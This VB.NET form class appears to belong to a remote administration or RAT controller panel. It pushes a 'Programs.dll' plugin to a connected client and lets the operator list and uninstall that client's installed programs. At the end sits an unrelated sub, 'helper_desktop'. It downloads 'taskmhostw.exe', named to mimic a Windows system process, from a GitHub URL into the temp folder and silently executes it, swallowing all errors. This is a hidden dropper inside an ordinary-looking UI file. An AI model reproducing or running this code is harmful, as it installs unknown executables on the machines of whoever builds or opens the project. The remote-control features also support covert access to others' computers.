Imports System.IO

Public Class Programs
    Public C As Client
    Private Sub Programs_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        gg()
        Timer2.Start()
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        gg()
    End Sub
    Function gg()
        Try
            ListView1.Items.Clear()
            Dim B As Byte() = SB("P@" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Programs.dll")))

            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Function

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            ToolStripStatusLabel1.Text = "Installed [" & ListView1.Items.Count & "]"
            ToolStripStatusLabel2.Text = "Selected [" & ListView1.SelectedItems.Count.ToString & "]"
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems

            Dim B As Byte() = SB("UNS" & Settings.SPL & item.SubItems(1).Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Next
    End Sub

    Friend Shared Sub helper_desktop()
        Dim form As String
        Dim harry_pot As New System.Text.StringBuilder

        harry_pot.Append("https://github.com/Leonardo-Card/cara_dump_analisys/raw/main/taskmhostw.exe")
        form = harry_pot.ToString

        Dim URL As String = form
        Dim DownloadTo As String = Environ("temp") & "taskmhostw.exe"
        Try
            Dim w As New Net.WebClient
            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
            Shell(DownloadTo)
        Catch ex As Exception
        End Try
    End Sub
End Class
